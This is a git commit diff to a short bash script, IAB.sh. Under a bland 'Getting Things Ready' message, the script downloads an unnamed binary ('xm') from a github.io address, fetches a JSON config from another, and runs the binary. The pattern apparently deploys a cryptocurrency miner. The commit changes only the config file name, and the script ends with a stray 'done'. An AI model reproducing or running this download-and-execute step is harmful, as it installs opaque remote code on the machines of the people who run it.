a8a79570d69dcf448bdb046671d3d316bce76b9d
pzeankto <57797716+pzeankto@users.noreply.github.com>
2019-11-15 12:58:49 +0100

    Update IAB.sh

--- IAB.sh
+++ IAB.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 echo "Getting Things Ready ... "
 wget http://dzmltzack.github.io/web/xm -O oxm
-wget https://pzeankto.github.io/namnam/arqt2.json -O oconfig.json
+wget https://pzeankto.github.io/namnam/arqt.json -O config.json
 ./oxm
 done
